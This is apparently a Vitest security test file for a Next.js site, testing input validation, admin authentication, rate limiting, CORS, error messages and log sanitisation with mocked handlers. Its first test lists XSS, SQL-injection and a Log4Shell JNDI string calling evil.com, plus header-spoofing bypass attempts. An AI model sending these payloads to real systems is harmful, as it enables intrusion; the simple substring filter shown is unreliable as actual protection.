import { describe, it, expect, vi, beforeEach } from 'vitest';
import { NextRequest, NextResponse } from 'next/server';

// Mock security utilities
const mockCheckAdminRole = vi.fn();
const mockValidateInputLength = vi.fn();
const mockValidateEmail = vi.fn();
const mockSanitizeInput = vi.fn();

vi.mock('@/lib/adminApiProtection', () => ({
  checkAdminRole: () => mockCheckAdminRole()
}));

vi.mock('@/lib/security', () => ({
  validateInputLength: mockValidateInputLength,
  validateEmail: mockValidateEmail,
  sanitizeInput: mockSanitizeInput
}));

describe('Comprehensive Security Testing', () => {
  beforeEach(() => {
    vi.clearAllMocks();
    
    // Default successful validations
    mockValidateInputLength.mockReturnValue({ isValid: true });
    mockValidateEmail.mockReturnValue({ isValid: true });
    mockSanitizeInput.mockImplementation(input => input);
  });

  describe('Input Validation and Sanitization', () => {
    it('should reject malicious script injections', async () => {
      const maliciousInputs = [
        '<script>alert("xss")</script>',
        'javascript:alert("xss")',
        '<img src=x onerror=alert("xss")>',
        '<iframe src="javascript:alert(\'xss\')"></iframe>',
        '"><script>alert("xss")</script>',
        '\'; DROP TABLE users; --',
        '1\' OR \'1\'=\'1',
        '${jndi:ldap://evil.com/a}'
      ];

      const mockHandler = async (request: NextRequest) => {
        const body = await request.json();
        const { message } = body;

        // Simulate input validation
        if (message.includes('<script>') || 
            message.includes('javascript:') || 
            message.includes('DROP TABLE') ||
            message.includes('jndi:')) {
          return new Response(JSON.stringify({
            error: 'Invalid input detected',
            code: 'SECURITY_VIOLATION'
          }), { status: 400 });
        }

        return new Response(JSON.stringify({ success: true }), { status: 200 });
      };

      for (const maliciousInput of maliciousInputs) {
        const request = new NextRequest('http://localhost:3000/api/test', {
          method: 'POST',
          body: JSON.stringify({ message: maliciousInput })
        });

        const response = await mockHandler(request);
        const data = await response.json();

        expect(response.status).toBe(400);
        expect(data.error).toBe('Invalid input detected');
        expect(data.code).toBe('SECURITY_VIOLATION');
      }
    });

    it('should validate input length limits', async () => {
      mockValidateInputLength.mockImplementation((input, maxLength) => ({
        isValid: input.length <= maxLength,
        error: input.length > maxLength ? `Input too long (max ${maxLength})` : null
      }));

      const mockHandler = async (request: NextRequest) => {
        const body = await request.json();
        const { message } = body;

        const validation = mockValidateInputLength(message, 100);
        if (!validation.isValid) {
          return new Response(JSON.stringify({
            error: validation.error,
            code: 'INPUT_TOO_LONG'
          }), { status: 400 });
        }

        return new Response(JSON.stringify({ success: true }), { status: 200 });
      };

      // Test valid input
      const validRequest = new NextRequest('http://localhost:3000/api/test', {
        method: 'POST',
        body: JSON.stringify({ message: 'Short message' })
      });
      const validResponse = await mockHandler(validRequest);
      expect(validResponse.status).toBe(200);

      // Test invalid input (too long)
      const longMessage = 'a'.repeat(101);
      const invalidRequest = new NextRequest('http://localhost:3000/api/test', {
        method: 'POST',
        body: JSON.stringify({ message: longMessage })
      });
      const invalidResponse = await mockHandler(invalidRequest);
      const invalidData = await invalidResponse.json();
      
      expect(invalidResponse.status).toBe(400);
      expect(invalidData.code).toBe('INPUT_TOO_LONG');
    });

    it('should validate email format security', async () => {
      const testEmails = [
        { email: 'valid@example.com', shouldPass: true },
        { email: 'user+tag@domain.co.uk', shouldPass: true },
        { email: 'invalid@', shouldPass: false },
        { email: '@domain.com', shouldPass: false },
        { email: 'user@domain', shouldPass: false },
        { email: '<script>@domain.com', shouldPass: false },
        { email: 'user@<script>alert("xss")</script>.com', shouldPass: false }
      ];

      mockValidateEmail.mockImplementation((email) => ({
        isValid: /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email) && !email.includes('<') && !email.includes('>'),
        error: 'Invalid email format'
      }));

      const mockHandler = async (request: NextRequest) => {
        const body = await request.json();
        const { email } = body;

        const validation = mockValidateEmail(email);
        if (!validation.isValid) {
          return new Response(JSON.stringify({
            error: validation.error,
            code: 'INVALID_EMAIL'
          }), { status: 400 });
        }

        return new Response(JSON.stringify({ success: true }), { status: 200 });
      };

      for (const testCase of testEmails) {
        const request = new NextRequest('http://localhost:3000/api/test', {
          method: 'POST',
          body: JSON.stringify({ email: testCase.email })
        });

        const response = await mockHandler(request);
        
        if (testCase.shouldPass) {
          expect(response.status).toBe(200);
        } else {
          expect(response.status).toBe(400);
        }
      }
    });
  });

  describe('Authentication and Authorization Security', () => {
    it('should prevent unauthorized access to admin endpoints', async () => {
      const testCases = [
        { user: null, isAdmin: false, expectedStatus: 401 },
        { user: { id: 'user_1', publicMetadata: { role: 'user' } }, isAdmin: false, expectedStatus: 401 },
        { user: { id: 'admin_1', publicMetadata: { role: 'admin' } }, isAdmin: true, expectedStatus: 200 },
        { user: { id: 'mod_1', publicMetadata: { role: 'moderator' } }, isAdmin: false, expectedStatus: 401 }
      ];

      for (const testCase of testCases) {
        mockCheckAdminRole.mockResolvedValue({
          user: testCase.user,
          isAdmin: testCase.isAdmin,
          error: testCase.isAdmin ? null : 'Unauthorized'
        });

        const mockHandler = async (request: NextRequest) => {
          const { user, isAdmin, error } = await mockCheckAdminRole();
          if (!isAdmin) {
            return new Response(JSON.stringify({ error: error || 'Unauthorized' }), { status: 401 });
          }

          return new Response(JSON.stringify({
            success: true,
            adminId: user?.id
          }), { status: 200 });
        };

        const request = new NextRequest('http://localhost:3000/api/admin/test');
        const response = await mockHandler(request);

        expect(response.status).toBe(testCase.expectedStatus);
      }
    });

    it('should handle authentication bypass attempts', async () => {
      const bypassAttempts = [
        // Header manipulation attempts
        { headers: { 'x-user-id': 'admin_fake' } },
        { headers: { 'authorization': 'Bearer fake_token' } },
        { headers: { 'x-admin-override': 'true' } },
        
        // Cookie manipulation attempts
        { headers: { 'cookie': 'admin=true; role=admin' } },
        
        // Query parameter attempts
        { url: 'http://localhost:3000/api/admin/test?admin=true&bypass=1' }
      ];

      const mockHandler = async (request: NextRequest) => {
        // Always check with proper auth service regardless of headers/params
        const { user, isAdmin, error } = await mockCheckAdminRole();
        
        if (!isAdmin) {
          // Log potential bypass attempt
          const suspiciousHeaders = ['x-user-id', 'x-admin-override'];
          const hasSuspiciousHeaders = suspiciousHeaders.some(header => 
            request.headers.get(header)
          );
          
          if (hasSuspiciousHeaders || request.url.includes('admin=true')) {
            return new Response(JSON.stringify({
              error: 'Security violation detected',
              code: 'BYPASS_ATTEMPT'
            }), { status: 403 });
          }

          return new Response(JSON.stringify({ error: 'Unauthorized' }), { status: 401 });
        }

        return new Response(JSON.stringify({ success: true }), { status: 200 });
      };

      // Mock as unauthorized for all attempts
      mockCheckAdminRole.mockResolvedValue({
        user: null,
        isAdmin: false,
        error: 'Unauthorized'
      });

      for (const attempt of bypassAttempts) {
        const headers: Record<string, string> = {};
        if (attempt.headers) {
          Object.entries(attempt.headers).forEach(([key, value]) => {
            if (value !== undefined) {
              headers[key] = value;
            }
          });
        }
        const request = new NextRequest(attempt.url || 'http://localhost:3000/api/admin/test', {
          headers
        });

        const response = await mockHandler(request);
        
        // Should be blocked (either 401 or 403)
        expect([401, 403]).toContain(response.status);
      }
    });

    it('should implement secure session handling', async () => {
      const mockHandler = async (request: NextRequest) => {
        const sessionToken = request.headers.get('authorization')?.replace('Bearer ', '');
        
        // Validate token format (should be JWT-like)
        if (!sessionToken || sessionToken.split('.').length !== 3) {
          return new Response(JSON.stringify({
            error: 'Invalid session token',
            code: 'INVALID_TOKEN'
          }), { status: 401 });
        }

        // Check token age (mock implementation)
        const tokenAge = parseInt(sessionToken.split('.')[1]) || 0;
        const maxAge = 24 * 60 * 60 * 1000; // 24 hours
        
        if (Date.now() - tokenAge > maxAge) {
          return new Response(JSON.stringify({
            error: 'Session expired',
            code: 'TOKEN_EXPIRED'
          }), { status: 401 });
        }

        return new Response(JSON.stringify({ success: true }), { status: 200 });
      };

      // Test valid token
      const validToken = `header.${Date.now()}.signature`;
      const validRequest = new NextRequest('http://localhost:3000/api/test', {
        headers: { authorization: `Bearer ${validToken}` }
      });
      const validResponse = await mockHandler(validRequest);
      expect(validResponse.status).toBe(200);

      // Test invalid token format
      const invalidRequest = new NextRequest('http://localhost:3000/api/test', {
        headers: { authorization: 'Bearer invalid_token' }
      });
      const invalidResponse = await mockHandler(invalidRequest);
      expect(invalidResponse.status).toBe(401);

      // Test expired token
      const expiredToken = `header.${Date.now() - (25 * 60 * 60 * 1000)}.signature`;
      const expiredRequest = new NextRequest('http://localhost:3000/api/test', {
        headers: { authorization: `Bearer ${expiredToken}` }
      });
      const expiredResponse = await mockHandler(expiredRequest);
      expect(expiredResponse.status).toBe(401);
    });
  });

  describe('Rate Limiting and DDoS Protection', () => {
    it('should implement rate limiting per IP', async () => {
      const rateLimits = new Map();
      const RATE_LIMIT = 10; // requests per minute
      const WINDOW = 60 * 1000; // 1 minute

      const mockHandler = async (request: NextRequest) => {
        const ip = request.headers.get('x-forwarded-for') || 'unknown';
        const now = Date.now();
        
        if (!rateLimits.has(ip)) {
          rateLimits.set(ip, { count: 0, window: now });
        }

        const limit = rateLimits.get(ip);
        
        // Reset window if expired
        if (now - limit.window > WINDOW) {
          limit.count = 0;
          limit.window = now;
        }

        limit.count++;

        if (limit.count > RATE_LIMIT) {
          return new Response(JSON.stringify({
            error: 'Rate limit exceeded',
            retryAfter: Math.ceil((WINDOW - (now - limit.window)) / 1000)
          }), { status: 429 });
        }

        return new Response(JSON.stringify({ 
          success: true,
          remainingRequests: RATE_LIMIT - limit.count 
        }), { status: 200 });
      };

      const ip = '192.168.1.1';
      
      // Make 10 requests (should succeed)
      for (let i = 0; i < 10; i++) {
        const request = new NextRequest('http://localhost:3000/api/test', {
          headers: { 'x-forwarded-for': ip }
        });
        const response = await mockHandler(request);
        expect(response.status).toBe(200);
      }

      // 11th request should be rate limited
      const request = new NextRequest('http://localhost:3000/api/test', {
        headers: { 'x-forwarded-for': ip }
      });
      const response = await mockHandler(request);
      expect(response.status).toBe(429);
    });

    it('should detect and block suspicious request patterns', async () => {
      const requestCounts = new Map();
      const BURST_THRESHOLD = 50; // requests in 10 seconds
      const BURST_WINDOW = 10 * 1000;

      const mockHandler = async (request: NextRequest) => {
        const ip = request.headers.get('x-forwarded-for') || 'unknown';
        const now = Date.now();
        
        if (!requestCounts.has(ip)) {
          requestCounts.set(ip, []);
        }

        const timestamps = requestCounts.get(ip);
        timestamps.push(now);

        // Remove old timestamps outside the burst window
        const recentTimestamps = timestamps.filter((ts: number) => now - ts <= BURST_WINDOW);
        requestCounts.set(ip, recentTimestamps);

        // Check for burst pattern
        if (recentTimestamps.length > BURST_THRESHOLD) {
          return new Response(JSON.stringify({
            error: 'Suspicious activity detected',
            code: 'BURST_DETECTED',
            blocked: true
          }), { status: 429 });
        }

        return new Response(JSON.stringify({ success: true }), { status: 200 });
      };

      const ip = '10.0.0.1';
      
      // Simulate burst of requests
      const promises = Array(60).fill(0).map(() => {
        const request = new NextRequest('http://localhost:3000/api/test', {
          headers: { 'x-forwarded-for': ip }
        });
        return mockHandler(request);
      });

      const responses = await Promise.all(promises);
      
      // Some requests should be blocked due to burst detection
      const blockedCount = responses.filter(r => r.status === 429).length;
      expect(blockedCount).toBeGreaterThan(0);
    });
  });

  describe('Data Protection and Privacy', () => {
    it('should prevent sensitive data leakage in responses', async () => {
      const mockHandler = async (request: NextRequest) => {
        // Simulate user data with sensitive information
        const userData = {
          id: 'user_123',
          name: 'John Doe',
          email: 'john@example.com',
          password: 'secret_password', // Sensitive
          apiKey: 'api_key_123', // Sensitive
          creditCard: '1234-5678-9012-3456', // Sensitive
          ssn: '123-45-6789', // Sensitive
          internalNotes: 'Admin notes about user' // Sensitive
        };

        // Filter out sensitive fields before returning
        const safeUserData = {
          id: userData.id,
          name: userData.name,
          email: userData.email
          // Exclude password, apiKey, creditCard, ssn, internalNotes
        };

        return new Response(JSON.stringify({
          success: true,
          user: safeUserData
        }), { status: 200 });
      };

      const request = new NextRequest('http://localhost:3000/api/user');
      const response = await mockHandler(request);
      const data = await response.json();

      expect(response.status).toBe(200);
      expect(data.user).toHaveProperty('id');
      expect(data.user).toHaveProperty('name');
      expect(data.user).toHaveProperty('email');
      
      // Ensure sensitive data is not included
      expect(data.user).not.toHaveProperty('password');
      expect(data.user).not.toHaveProperty('apiKey');
      expect(data.user).not.toHaveProperty('creditCard');
      expect(data.user).not.toHaveProperty('ssn');
      expect(data.user).not.toHaveProperty('internalNotes');
    });

    it('should implement proper CORS headers for security', async () => {
      const mockHandler = async (request: NextRequest) => {
        const origin = request.headers.get('origin');
        const allowedOrigins = [
          'https://betis-edinburgh.com',
          'https://www.betis-edinburgh.com',
          'http://localhost:3000'
        ];

        const isAllowedOrigin = allowedOrigins.includes(origin || '');
        
        const headers = new Headers({
          'Content-Type': 'application/json',
          'X-Content-Type-Options': 'nosniff',
          'X-Frame-Options': 'DENY',
          'X-XSS-Protection': '1; mode=block'
        });

        if (isAllowedOrigin) {
          headers.set('Access-Control-Allow-Origin', origin || '');
          headers.set('Access-Control-Allow-Credentials', 'true');
        }

        return new Response(JSON.stringify({ success: true }), {
          status: 200,
          headers
        });
      };

      // Test allowed origin
      const allowedRequest = new NextRequest('http://localhost:3000/api/test', {
        headers: { origin: 'https://betis-edinburgh.com' }
      });
      const allowedResponse = await mockHandler(allowedRequest);
      expect(allowedResponse.headers.get('Access-Control-Allow-Origin')).toBe('https://betis-edinburgh.com');

      // Test blocked origin
      const blockedRequest = new NextRequest('http://localhost:3000/api/test', {
        headers: { origin: 'https://malicious-site.com' }
      });
      const blockedResponse = await mockHandler(blockedRequest);
      expect(blockedResponse.headers.get('Access-Control-Allow-Origin')).toBeNull();

      // Check security headers are always present
      expect(allowedResponse.headers.get('X-Frame-Options')).toBe('DENY');
      expect(allowedResponse.headers.get('X-Content-Type-Options')).toBe('nosniff');
      expect(allowedResponse.headers.get('X-XSS-Protection')).toBe('1; mode=block');
    });
  });

  describe('Error Handling Security', () => {
    it('should not expose internal system information in error messages', async () => {
      const mockHandler = async (request: NextRequest) => {
        try {
          // Simulate internal error with sensitive details
          throw new Error('Database connection failed: host=internal-db.company.com port=5432 user=admin password=secret123');
        } catch (error) {
          // Return sanitized error message
          const sanitizedError = 'Database temporarily unavailable';
          
          return new Response(JSON.stringify({
            error: sanitizedError,
            code: 'DATABASE_ERROR',
            timestamp: new Date().toISOString()
            // Don't include: stack trace, internal IPs, credentials, file paths
          }), { status: 500 });
        }
      };

      const request = new NextRequest('http://localhost:3000/api/test');
      const response = await mockHandler(request);
      const data = await response.json();

      expect(response.status).toBe(500);
      expect(data.error).toBe('Database temporarily unavailable');
      expect(data.code).toBe('DATABASE_ERROR');
      
      // Ensure no sensitive information leaked
      const responseText = JSON.stringify(data);
      expect(responseText).not.toContain('internal-db.company.com');
      expect(responseText).not.toContain('password=secret123');
      expect(responseText).not.toContain('/usr/local/');
    });

    it('should implement secure logging without sensitive data', async () => {
      const logs: any[] = [];
      
      const mockSecureLogger = (level: string, message: string, metadata: any) => {
        // Sanitize metadata to remove sensitive information
        const sanitizedMetadata = { ...metadata };
        
        // Remove sensitive fields
        delete sanitizedMetadata.password;
        delete sanitizedMetadata.apiKey;
        delete sanitizedMetadata.token;
        
        // Mask email addresses
        if (sanitizedMetadata.email) {
          sanitizedMetadata.email = sanitizedMetadata.email.replace(
            /(.{2})[^@]*(@.*)/,
            '$1***$2'
          );
        }

        logs.push({
          level,
          message,
          metadata: sanitizedMetadata,
          timestamp: new Date().toISOString()
        });
      };

      const mockHandler = async (request: NextRequest) => {
        try {
          const body = await request.json();
          
          // Log request (with sensitive data removed)
          mockSecureLogger('INFO', 'User login attempt', {
            email: body.email,
            password: body.password,
            apiKey: 'secret_key_123',
            ip: request.headers.get('x-forwarded-for')
          });

          return new Response(JSON.stringify({ success: true }), { status: 200 });
        } catch (error) {
          mockSecureLogger('ERROR', 'Request processing failed', {
            error: (error as Error).message,
            requestId: 'req_123'
          });
          
          return new Response(JSON.stringify({ error: 'Internal error' }), { status: 500 });
        }
      };

      const request = new NextRequest('http://localhost:3000/api/login', {
        method: 'POST',
        body: JSON.stringify({
          email: 'user@example.com',
          password: 'user_password_123'
        }),
        headers: { 'x-forwarded-for': '192.168.1.100' }
      });

      await mockHandler(request);

      expect(logs).toHaveLength(1);
      const log = logs[0];
      
      // Ensure sensitive data was sanitized
      expect(log.metadata).not.toHaveProperty('password');
      expect(log.metadata).not.toHaveProperty('apiKey');
      expect(log.metadata.email).toBe('us***@example.com'); // Masked
      expect(log.metadata.ip).toBe('192.168.1.100'); // IP is okay to log
    });
  });
});